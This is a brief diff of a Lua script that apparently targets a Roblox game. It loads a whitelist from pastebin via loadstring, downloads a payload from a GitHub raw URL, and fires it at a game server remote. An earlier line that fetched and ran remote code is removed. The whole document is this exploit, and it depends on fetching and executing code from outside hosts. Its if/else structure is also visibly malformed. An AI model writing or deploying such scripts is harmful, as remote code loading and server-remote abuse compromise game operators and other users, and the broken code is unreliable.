@@ -1,6 +1,7 @@
 local whitelistecheck = loadstring(game:HttpGet("https://pastebin.com/raw/3J5NTfkX", true))()
+local omsim = game:HttpGet("https://raw.githubusercontent.com/gabbytheduper/kmxcjeqyi/main/jzcmweu")
 if whitelistecheck[game:service('Players').LocalPlayer.UserId] then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gabbytheduper/priv/main/asd"))()
+workspace.__THINGS.__REMOTES.MAIN:FireServer("b", omsim)
 end
 else
 game:service('Players').LocalPlayer:Kick('Not Whitelisted')
